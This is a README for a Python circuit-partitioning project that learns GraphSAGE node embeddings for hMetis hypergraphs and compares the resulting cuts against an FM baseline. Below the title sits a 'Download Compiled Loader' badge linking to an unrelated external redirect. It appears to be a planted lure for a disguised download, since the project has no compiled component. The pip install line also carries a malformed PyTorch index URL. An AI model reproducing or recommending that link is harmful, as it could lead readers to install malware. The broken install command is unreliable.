# Circuit Partitioning with Unsupervised GraphSAGE

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

A 2-way circuit partitioner for `.hgr` hypergraphs (hMetis format). The
pipeline learns per-node embeddings with an unsupervised 2-layer
GraphSAGE, then partitions via weighted k-means with a strict 49–51%
balance constraint. Cut-net counts are compared against an FM baseline
(provided in `fm_usc.py`).

Reference paper: TP-GNN (DAC 2020) — see `tpgnn.pdf`.

---

## Setup

```bash
conda create -n partition python=3.11 -y
conda activate partition

# Pick the matching torch wheel for your CUDA. cu124 = CUDA 12.4 / 12.x
# driver. Use cu118 / cu121 if your driver is older, or omit "+cu124" for
# CPU-only.
pip install torch --index-url https://.pytorch.org/whl/cu124
pip install -r requirements.txt
```

`torch-scatter` and `torch-sparse` are intentionally NOT installed —
`torch_geometric` falls back to native PyTorch ops for everything we use.

---

## End-to-end pipeline

Each phase has its own subcommand under `python -m src.main`. Outputs
land in a per-phase top-level directory (`clique/`, `features/`,
`embeddings/`) so `results/` only ever holds final partition output.

```bash
conda activate partition

# Phase 1: FM baseline (provided binary, multi-seed)
for s in 1 2 3 42 123; do
  python fm_usc.py data/fract.hgr --runs 5 --seed $s --output-dir results/fm/partitions
  python fm_usc.py data/ibm01.hgr --runs 5 --seed $s --output-dir results/fm/partitions
  python fm_usc.py data/ibm10.hgr --runs 3 --seed $s --output-dir results/fm/partitions
done
python results/fm/aggregate.py    # writes results/fm/baseline.{md,csv}

# Phase 2: hypergraph -> weighted clique graph
python -m src.main build-graph --benchmark data/*.hgr

# Phase 4: per-vertex feature tensor (6 features, z-score normalized)
python -m src.main compute-features --benchmark data/*.hgr

# Phase 5: unsupervised GraphSAGE training
python -m src.main train --benchmark data/*.hgr               # auto -> cuda:0 if available
python -m src.main train --benchmark data/ibm10.hgr --device cuda:1   # pick a specific GPU

# Phase 6: weighted k-means + balance repair (5 seeds, best-of-N)
python -m src.main partition --benchmark data/*.hgr

# Phase 7: aggregate FM + GNN results, run sanity checks
python -m src.main evaluate --benchmark data/*.hgr            # writes results/comparison.{csv,md}

# Phase 8: t-SNE visualization (saves PNG + 2D coord cache)
python -m src.main visualize --benchmark data/*.hgr
```

Tkinter dashboard (read-only — loads pre-computed artifacts):

```bash
python -m src.gui
```

---

## Per-subcommand reference

| Subcommand        | Inputs                                     | Outputs |
|-------------------|--------------------------------------------|---------|
| `build-graph`     | `data/<bench>.hgr`                         | `clique/<bench>/graph.pt`, `graph_info.json` |
| `compute-features`| `data/<bench>.hgr`, `clique/<bench>/`      | `features/<bench>/features.pt`, `features_info.json` |
| `train`           | `data/<bench>.hgr`, `clique/`, `features/` | `embeddings/<bench>/embeddings.pt`, `train_info.json`, `train_log.jsonl` |
| `partition`       | `data/<bench>.hgr`, `embeddings/`          | `results/gnn/<bench>/{partA,partB}.txt`, `partition_info.json` |
| `evaluate`        | `results/fm/baseline.csv`, all of the above | `results/comparison.{csv,md}` |
| `visualize`       | `embeddings/`, `results/gnn/`              | `results/plots/<bench>_tsne.png`, `<bench>_tsne_coords.npz` |

All subcommands accept `--benchmark data/*.hgr` for batch processing.
Run `python -m src.main <subcommand> --help` for the full flag list.

### Most-used flags

| Flag | Default | What it does |
|------|---------|--------------|
| `--device` (`train`) | `auto` | `cpu` / `cuda` / `cuda:0` / `cuda:1` / `auto` |
| `--max-epochs` (`train`) | `100` | hard cap on training epochs |
| `--patience` (`train`) | `10` | early-stop after N epochs without improvement |
| `--seeds` (`partition`) | `"1,2,3,42,123"` | comma- or space-separated; best-of-N is saved |
| `--features` (`compute-features`) | `auto` | `auto` (default 6) or comma-separated subset |
| `--min-ratio` / `--max-ratio` (`partition`) | `0.49` / `0.51` | strict balance constraint |

---

## Directory layout

```
.
├── data/                       # input .hgr files (read-only)
├── fm_usc.py                   # FM baseline (provided, do not modify)
├── tpgnn.pdf                   # reference paper
├── README.md                   # this file
├── requirements.txt
│
├── src/                        # pipeline source
│   ├── data_loader.py          # hgr -> clique graph
│   ├── features.py             # 6-feature registry + z-score
│   ├── gnn_model.py            # NeighborSampler + 2-layer GraphSAGE
│   ├── train.py                # unsupervised loop + JSONL epoch log
│   ├── cluster.py              # weighted k-means + balance repair + cutsize
│   ├── evaluate.py             # comparison.csv/md + sanity checks
│   ├── visualize.py            # t-SNE + 2D coord cache
│   ├── gui.py                  # Tkinter dashboard
│   └── main.py                 # CLI dispatcher
│
├── clique/<bench>/             # Phase 2 output
├── features/<bench>/           # Phase 4 output
├── embeddings/<bench>/         # Phase 5 output (incl. live JSONL log)
└── results/                    # FINAL outputs only
    ├── fm/                     # FM baseline logs / partitions / baseline.{md,csv}
    ├── gnn/<bench>/            # final GNN partition + metadata
    ├── plots/                  # t-SNE PNGs + coord caches
    ├── comparison.csv
    └── comparison.md
```

---

## What gets logged

- `train_log.jsonl` — line-buffered, one JSON object per epoch
  (`{epoch, loss, best_loss, patience, time_s}`). Survives Ctrl+C.
- `train_info.json` — final summary (best_loss, n_pairs, history,
  walks_seconds, train_seconds, device, all hyperparameters).
- `partition_info.json` — per-seed full breakdown
  (`pre_repair_ratio`, `post_repair_ratio`, `repair_moves`, `cluster_seconds`)
  plus aggregate `best_seed`, `best_cut`, `mean_cut`, `std_cut`, `worst_cut`.
- `comparison.{csv,md}` — side-by-side FM vs GNN with two runtime views
  (single-seed and best-of-5).

---

## Reproducibility

Fix the seeds: train uses `--seed 42`; partition uses
`--seeds "1,2,3,42,123"` by default. Both forward the seed to
`torch.manual_seed`, `torch.cuda.manual_seed_all`, NumPy, and sklearn.
GraphSAGE inference involves random neighbor sampling, so embeddings are
stochastic per call but deterministic for a fixed seed.

---

